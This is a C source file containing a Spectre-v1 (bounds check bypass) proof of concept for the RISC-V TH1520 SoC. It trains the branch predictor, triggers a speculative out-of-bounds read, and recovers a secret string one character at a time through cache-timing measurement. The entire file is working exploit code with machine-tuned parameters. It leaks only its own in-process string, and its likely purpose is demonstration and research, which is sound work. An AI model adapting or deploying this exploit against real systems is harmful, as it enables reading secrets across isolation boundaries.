#include <stdio.h>
#include <stdint.h>
#include <string.h> // For strlen()
#include <stdlib.h> // For rand() and srand()
#include <time.h> // For time(NULL)
#include "util_riscv.h"
#include "util_shared.h"
#include "cache.h"


/* >>>>>> Mostly used parameters for debugging are listed below. >>>>>> */
/*
 * 1. Variable and function names are in lower camel case, i.e. camelCase, or sneak case, i.e. sneak_case.
 * 2. (at)input, (at)inout, etc may be used for preprocessors.
 */

/**
 * The following parameters vary with machines and are obtained from experiments,
 * using "control variates method" and "binary/half-interval/logarithmic search/".
 */
#define TRAIN_TIMES 24 // Times to train the predictor. There shall be an ideal value for each machine.
// Note: smaller TRAIN_TIMES values increase misses or even cause failure, while larger ones unnecessarily take longer time.
#define ATTACK_ROUNDS 40 // Times to attack the same index. Ideal to have larger ATTACK_ROUNDS (takes more time but statistically better).
#define CACHE_HIT_THRESHOLD 43 // Interval smaller than CACHE_HIT_THRESHOLD will be deemed as "cache hit". Ideal to have lower CACHE_HIT_THRESHOLD (higher accuracy).
// To keep results accurate, the larger TRAIN_TIMES and ATTACK_ROUNDS you have, the smaller CACHE_HIT_THRESHOLD shoud be.

/* <<<<<< Mostly used parameters for debugging are listed above. <<<<<< */


#define DEFAULT_STRING "#Secret_Information!"
#define MAX_STRING_LENGTH_FACTOR 8
/**
 * Arbitrary as long as your machine allows it
 */

#define ARRAY_STRIDE L1_DCACHE_BLOCK_BYTES
/**
 * Reference from Lipp et al, 2018, Meltdown:
 * Based on the value of data in this example, a different part of the cache is accessed when executing the memory access out of order.
 * As data is multiplied by L1_DCACHE_BLOCK_BYTES (found with getconf PAGE_SIZE, typically 4096), data accesses to probe array are scattered over the array
 * with a distance of L1_DCACHE_BLOCK_BYTES Bytes (typically 4 KB, assuming an 1 B data type for probe array, e.g. uint8_t).
 * Thus, there is an injective mapping from the value of data to a memory page, i.e., different values for data never result in an access to the same page.
 * Consequently, if a cache line of a page is cached, we know the value of data.
 * The spreading over pages eliminates false positives due to the prefetcher, as the prefetcher cannot access data across page boundaries.
 * This prevents the hardware prefetcher from loading adjacent memory locations into the cache as well.
 */

/** 
 * Assume the attacker knows following information in advance: 
 * - Hardware specifications
 * - Control of an guideArray (address, contents, size) and an probeArray (address, size)
 * - The start address of secretString (but no way to directly access contents of secretString)
 * - The character set of secretString and its size (such as extended ASCII which is 0~255, 8bit).
 */

/** 
 * Altough there are no direct accesses to secretString, after being "trained" for a certain times,
 * vulnerable processors will "grow accustomed to" legitimate inputs (such as branch-not-taken) fed deliberately by the attacker, 
 * and mistakenly predict that succeeding illegitimate attempts wll also be true, fetching secretString into cache.
 * The attacker can then exploit the shortened access time (because of cache) and apply cache SCAs methods,
 * to infer characters of secretString one by one, using brutal force (exhausting all 256 possibities of extended ASCII).
 */

#define RESULT_ARRAY_SIZE 256
/**
 * In this example program, all secret characters are in extended ASCII codes (0~255, 8bit).
 * Ofc you may change it for others like Unicode, but that will complicate everything, 
 * and will also introduce REALLY high performance requirements.
 */

#define ARRAY_SIZE_FACTOR RESULT_ARRAY_SIZE
/**
 * The size of probeArray can not be smaller than the max element of guideArray.
 * Also the size of guideArray can not be smaller than "size of the probeArray divided by ARRAY_STRIDE".
 * For simplicity they are set the same in this program using ARRAY_SIZE_FACTOR.
 * (Basically there is no point in designating these parameters of guideArray separately.)
 *
 * At the same time, ARRAY_SIZE_FACTOR must be no smaller than RESULT_ARRAY_SIZE (which is further restricted by character set size),
 * and be a power of 2, e. g. legal value 512, 1024, etc. and illegal value 384.
 * For simplicity it is to set equal to RESULT_ARRAY_SIZE and has been proved to be sufficient. 
 */

uint8_t guideArray[ARRAY_SIZE_FACTOR];
// The attacker will use guideArray starting address as the base for attacks.
uint8_t probeArray[ARRAY_SIZE_FACTOR * ARRAY_STRIDE];

/* Declare a global variable that prevents the compiler from optimizing out victimFunc() . */
uint8_t anchorVar = 0;

// Note: guideArraySize has to be kept as a global variable for attacker manipulations.
// This dynamic condtion plus a cache flush before attack 
// helps to expand the size of the speculation window, but it is not necessary.
uint64_t guideArraySize = ARRAY_SIZE_FACTOR;
// Simply keep this value unchanged if you do not want to bother. 
uint8_t shift_base = 2;

/**
 * @input idx input to be used to idx the array
 */
void victimFunc(uint64_t idx){

	// Longer delay means easier attack. Adjust these parameters according to the performance of your machine.
	// Left shift offset equals to the number of fdiv.s (equivalent to right shift for 1 bit) rows. 
	// For example, if you left shift 4, you should also decrease the number of "fdiv.s	fa5, fa5, fa4\n" rows to 4.
	guideArraySize = guideArraySize << 8;
	asm("fcvt.s.lu	fa4, %[in]\n"
		"fcvt.s.lu	fa5, %[inout]\n"
		"fdiv.s	fa5, fa5, fa4\n"
		"fdiv.s	fa5, fa5, fa4\n"
		"fdiv.s	fa5, fa5, fa4\n"
		"fdiv.s	fa5, fa5, fa4\n"
		"fdiv.s	fa5, fa5, fa4\n"
		"fdiv.s	fa5, fa5, fa4\n"
		"fdiv.s	fa5, fa5, fa4\n"
		"fdiv.s	fa5, fa5, fa4\n"
		"fcvt.lu.s	%[out], fa5, rtz\n"
		: [out] "=r" (guideArraySize)
		: [inout] "r" (guideArraySize), [in] "r" (shift_base)
		: "fa4", "fa5");

	if (idx < guideArraySize){
		anchorVar &= probeArray[guideArray[idx] * ARRAY_STRIDE];
	}

}

// TBD: mix the order in other ways.
#define MIXER_A 65 // min 65. 163, 167, 127, 111. Must be larger than 64.
#define MIXER_B 1 // Arbitrary as long as larger than 0.

int main(void){
	
	printf("****** Transient Execution Attack Demonstration ******\n");
	printf("- Type of Attack: Spectre-BCB (a.k.a Spectre-v1)\n");
	printf("- Target Chipset: RISC-V TH1520 SoC (Quad T-Head XuanTie C910)\n");
	
	char* defaultString = DEFAULT_STRING;
	int maxStringLength = strlen(defaultString) * MAX_STRING_LENGTH_FACTOR;
    char* secretString;
	// Allocate memory for the string. 
	// Need to do this in main function because return 1 of subfuction will not terminate the main.
	secretString = malloc(maxStringLength * sizeof(char));
	if (secretString == NULL) {
		printf("Error: Memory allocation failed.\n");
		return 1; // Indicate error
	}
	
	dynamicInputString(defaultString, maxStringLength, secretString);
	
	uint64_t attackIdx = (uint64_t)(secretString - (char*)guideArray);
	uint64_t passInIdx, randIdx, mixed_i;
	register uint64_t start, diff;
	uint64_t dummy;

	// Get the highest and second highest hit values in results().
	// Each index (from 0 to RESULT_ARRAY_SIZE-1) of results() represents a character,
	// and its corresponding stored array value means cache hits.
	static uint64_t results[RESULT_ARRAY_SIZE];
	uint8_t output[2];
	uint64_t hitArray[2];
	
	char guessString[strlen(secretString)+1];
	/* Fill the guessString with NULL terminators. */
	for (int i = 0; i < sizeof(guessString); i++){
		guessString[i] = '\0';
	}

	srand(time(NULL));

	/* Fill the guideArray with random numbers. */
	for (int i = 0; i < sizeof(guideArray); i++){
		guideArray[i] = rand() % (ARRAY_SIZE_FACTOR+1);
	}

	/* Write to probeArray so in RAM not copy-on-write zero pages. */
	for (int i = 0; i < sizeof(probeArray); i++){
		probeArray[i] = 1;
	}

	printf("------ Start of Attack ------\n");
	printf("MemAddr ~ StrOffset ~ TargetChar <-?-- GuessResult(Char, Dec, Hits)\n"); 

	// Note: strlen() calculates the length of a string up to, but not including, the terminating null \n character.
	// About strlen() function: https://en.cppreference.com/w/cpp/string/byte/strlen
	// Note: sizeof() does not care about the value of a string, so can not be used here.
	// Ref: https://www.geeksforgeeks.org/difference-strlen-sizeof-string-c-reviewed/
	for(uint64_t len = 0; len < (strlen(secretString)); len++){
		
		// Clear results every round.
		for(uint64_t cIdx = 0; cIdx < RESULT_ARRAY_SIZE; cIdx++){
			results[cIdx] = 0;
		}

		// Run the attack on the same idx for ATTACK_ROUNDS times.
		for(uint64_t atkRound = 0; atkRound < ATTACK_ROUNDS; atkRound++){

			// Make sure array you read from is not in the cache.
			flushCache(guideArraySize, sizeof(guideArraySize));
			flushCache((uint64_t)probeArray, sizeof(probeArray));

			/* It's common practice to use the % operator in conjunction with rand() to get a range. */
			/* Ref 1: https://stackoverflow.com/questions/822323/how-to-generate-a-random-int-in-c */
			/* Ref 2: https://www.geeksforgeeks.org/generating-random-number-range-c/ */
			/* Correctness of position of this instruction has been checked. */
			randIdx = rand() % sizeof(guideArray);

			for(int64_t j = TRAIN_TIMES-1; j >= 0; j--){
 				
				passInIdx = ((j % (TRAIN_TIMES+1)) - 1) & ~0xFFFF; // Originally 0xFFFF for 32 bit. After every TRAIN_TIMES set passInIdx=...FFFF0000 else 0
				passInIdx = (passInIdx | (passInIdx >> 16)); //16 set the passInIdx=-1 or 0
				passInIdx = randIdx ^ (passInIdx & (attackIdx ^ randIdx)); // select randIdx or attackIdx

				/* Delay (act as mfence, memory fence) */
				// Set of constant takens to make the BHR be in a all taken state				
				for(volatile int k = 0; k < ARRAY_SIZE_FACTOR; k++){
					asm("");
				}
				
				// Call victim function to train or attack.
				victimFunc(passInIdx);
				
			}
				
			// Read out probeArray and see the hit secret value.		
			/* Time reads. Order is slightly mixed up to prevent stride prediction (prefetching). */
			for (int i = 0; i < ARRAY_SIZE_FACTOR; i++) {
				mixed_i = ((i * MIXER_A) + MIXER_B) & (ARRAY_SIZE_FACTOR-1);
				start = READ_CSR(cycle);
				dummy &= probeArray[mixed_i * ARRAY_STRIDE];
				diff = (READ_CSR(cycle) - start);
			
				// Condition: interval of time is smaller than the threshold, AND the character is not a legal addreess value predefined.			
				if ((uint64_t)diff < CACHE_HIT_THRESHOLD && mixed_i != guideArray[randIdx]){
					results[mixed_i]++; /* Cache hit */
				}
			}
		}

		/* Use junk so above 'dummy=' row won't get optimized out. Order of the following insturctions seems to be in a fixed position. */
		/* results[0] of static array results() will always be translated into a NULL control character in ASCII or Unicode, so don't worry. */
		/* ^ bitwise exclusive OR sets a one in each bit position where its operands have different bits, and zero where they are the same.*/
		results[0] ^= dummy;
		topTwoIdx(results, RESULT_ARRAY_SIZE, output, hitArray);

		printf("MA[%p] ~ SO(%lu) ~ TC("ANSI_CODE_YELLOW"%c"ANSI_CODE_RESET") <-?-- GR("ANSI_CODE_CYAN"%c"ANSI_CODE_RESET", %d, %lu)\n", (uint8_t*)(guideArray + attackIdx), len, secretString[len], output[0], output[0], hitArray[0]);

//		printf("m[%p] = offset(%lu) = want(%c) =?= guess(hits,dec,char) 1.(%lu, %d, %c) 2.(%lu, %d, %c)\n", (uint8_t*)(guideArray + attackIdx), len, secretString[len], hitArray[0], output[0], output[0], hitArray[1], output[1], output[1]); // For debugging purporses.

		guessString[len]=(char)output[0];
		
		// Read in the next secret.
		attackIdx++;
	}

	printf("------ End of Attack ------\n");
	
	printf("------ Summary ------\n");
    printf("Expected: "ANSI_CODE_YELLOW"%s"ANSI_CODE_RESET"\n", secretString);
	printf("Guessed: "ANSI_CODE_CYAN"%s"ANSI_CODE_RESET"\n", guessString);
	printf("****** That Is All for the Demonstration ******\n");
	
	// Free the allocated memory after use.
	free(secretString);

	return 0;
}
